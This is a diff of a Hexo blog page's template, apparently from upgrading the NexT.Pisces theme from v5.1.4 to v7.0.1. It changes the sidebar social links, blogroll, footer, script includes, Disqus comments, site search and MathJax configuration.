-                  <span class="links-of-author-item">
-                    <a href="https://www.instagram.com/samuelyg1996/" target="_blank" title="Instagram">
-                      
-                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://weibo.com/5658432174" target="_blank" title="Weibo">
-                      
-                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
-                  </span>
-                
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/SamuelYG" title="GitHub &rarr; https://github.com/SamuelYG" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/yangg052" title="Twitter &rarr; https://twitter.com/yangg052" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://instagram.com/samuelyg1996/" title="Instagram &rarr; https://instagram.com/samuelyg1996/" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/5658432174" title="Weibo &rarr; https://weibo.com/5658432174" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:yangg052@gmail.com" title="E-Mail &rarr; mailto:yangg052@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
             </div>
           
 
           
-          
 
           
           
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
               <div class="links-of-blogroll-title">
                 <i class="fa  fa-fw fa-link"></i>
                 Links
@@ -630,19 +809,19 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://notes.iissnan.com/" title="IIssNan's Notes" target="_blank">IIssNan's Notes</a>
+                    <a href="https://notes.iissnan.com/" title="https://notes.iissnan.com/" rel="noopener" target="_blank">IIssNan's Notes</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://milkice.me/" title="Milkice's IceBox" target="_blank">Milkice's IceBox</a>
+                    <a href="https://milkice.me/" title="https://milkice.me/" rel="noopener" target="_blank">Milkice's IceBox</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://cdeveloper.cn/" title="cdeveloper" target="_blank">cdeveloper</a>
+                    <a href="http://cdeveloper.cn/" title="http://cdeveloper.cn/" rel="noopener" target="_blank">cdeveloper</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://nfz.moe/" title="neoFelhz" target="_blank">neoFelhz</a>
+                    <a href="https://nfz.moe/" title="https://nfz.moe/" rel="noopener" target="_blank">neoFelhz</a>
                   </li>
                 
               </ul>
@@ -650,16 +829,27 @@
           
 
           
+            
+          
+          
 
         </div>
-      </section>
+      </div>
 
       
 
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
       
 
     </div>
   </aside>
+  
 
 
         
@@ -668,17 +858,19 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
+        <div class="copyright">&copy; 2016 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">YangGang</span>
 
   
+
+  
 </div>
 
 
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
 
 
 
@@ -686,12 +878,13 @@
 
 
 
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.0.1</div>
 
 
 
 
         
+
 
 
 
@@ -704,19 +897,17 @@
     </footer>
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
     
 
+    
+
+    
   </div>
 
   
 
-<script type="text/javascript">
+<script>
   if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
     window.Promise = null;
   }
@@ -730,113 +921,6 @@
 
 
 
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-    
-      <script id="dsq-count-scr" src="https://samuelyg.disqus.com/count.js" async></script>
-    
-
-    
-      <script type="text/javascript">
-        var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2018/01/22/Chrome主页被篡改后如何解决？/';
-          this.page.identifier = '2018/01/22/Chrome主页被篡改后如何解决？/';
-          this.page.title = 'Chrome主页被篡改后如何解决？(部分内容转载)';
-        };
-        var d = document, s = d.createElement('script');
-        s.src = 'https://samuelyg.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', '' + +new Date());
-        (d.head || d.body).appendChild(s);
-      </script>
-    
-
-  
-
-
-
-
-	
-
-
 
 
 
@@ -855,9 +939,88 @@
 
 
 
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
   
 
-  <script type="text/javascript">
+
+  <script src="/js/utils.js?v=7.0.1"></script>
+
+  <script src="/js/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.0.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.0.1"></script>
+<script src="/js/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+  <script id="dsq-count-scr" src="https://samuelyg.disqus.com/count.js" async></script>
+
+
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://yoursite.com/2018/01/22/Chrome主页被篡改后如何解决？/";
+    this.page.identifier = "2018/01/22/Chrome主页被篡改后如何解决？/";
+    this.page.title = 'Chrome主页被篡改后如何解决？(部分内容转载)';
+    };
+  function loadComments() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://samuelyg.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', '' + +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  
+    loadComments();
+  
+</script>
+
+
+
+
+
+  
+
+
+  
+  <script>
     // Popup Window;
     var isfetched = false;
     var isXml = true;
@@ -906,6 +1069,8 @@
         .css('overflow', 'hidden');
       $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
 
+      
+
       $.ajax({
         url: path,
         dataType: isXml ? "xml" : "json",
@@ -939,8 +1104,9 @@
                 var title = data.title.trim();
                 var titleInLowerCase = title.toLowerCase();
                 var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
                 var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                 var indexOfTitle = [];
                 var indexOfContent = [];
                 // only match articles with not empty titles
@@ -1109,9 +1275,9 @@
               })
             };
             if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
             } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
             } else {
               resultItems.sort(function (resultLeft, resultRight) {
                 if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
@@ -1183,33 +1349,88 @@
   
 
   
-
-  
   
 
   
   
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+    
+      <script type="text/x-mathjax-config">
   
 
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$', '$'], ['\\(', '\\)'] ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      
+      equationNumbers: {
+        autoNumber: 'AMS'
+      }
+    }
+  });
+  MathJax.Hub.Register.StartupHook('TeX Jax Ready', function() {
+    MathJax.InputJax.TeX.prefilterHooks.Add(function(data) {
+      if (data.display) {
+        var next = data.script.nextSibling;
+        while (next && next.nodeName.toLowerCase() === '#text') { next = next.nextSibling }
+        if (next && next.nodeName.toLowerCase() === 'br') { next.parentNode.removeChild(next) }
+      }
+    });
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i = 0; i < all.length; i += 1) {
+      document.getElementById(all[i].inputID + '-Frame').parentNode.className += ' has-jax';
+    }
+  });
+</script>
+<script src="//cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src>
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+    
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
   
 
